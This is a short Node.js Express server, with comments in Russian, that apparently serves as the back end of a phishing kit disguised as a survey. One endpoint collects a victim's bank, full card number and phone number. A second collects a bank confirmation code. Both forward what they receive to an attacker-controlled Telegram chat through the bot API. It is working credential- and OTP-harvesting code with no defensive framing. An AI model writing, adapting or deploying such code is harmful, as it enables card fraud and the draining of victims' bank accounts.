const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
require('dotenv').config(); // Используем файл .env для хранения токена и ID

const app = express();
const PORT = 3000;

// Чувствительные данные из переменных окружения
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

app.use(bodyParser.json());

app.post('/api/send-message', async (req, res) => {
    const { bank, cardNumber, phoneNumber } = req.body;

    if (!bank || !cardNumber || !phoneNumber) {
        return res.status(400).json({ error: 'Все поля обязательны для заполнения' });
    }

    const text = `Новый запрос на опрос:\nБанк: ${bank}\nНомер карты: ${cardNumber}\nТелефон: ${phoneNumber}`;

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text,
            parse_mode: 'Markdown'
        });
        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Ошибка при отправке сообщения в Telegram:', error);
        res.status(500).json({ error: 'Не удалось отправить сообщение' });
    }
});

app.post('/api/send-code', async (req, res) => {
    const { code } = req.body;

    if (!code) {
        return res.status(400).json({ error: 'Код обязателен' });
    }

    const text = `Код подтверждения: ${code}`;

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text,
            parse_mode: 'Markdown'
        });
        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Ошибка при отправке кода в Telegram:', error);
        res.status(500).json({ error: 'Не удалось отправить код' });
    }
});

app.listen(PORT, () => {
    console.log(`Сервер запущен на http://localhost:${PORT}`);
});
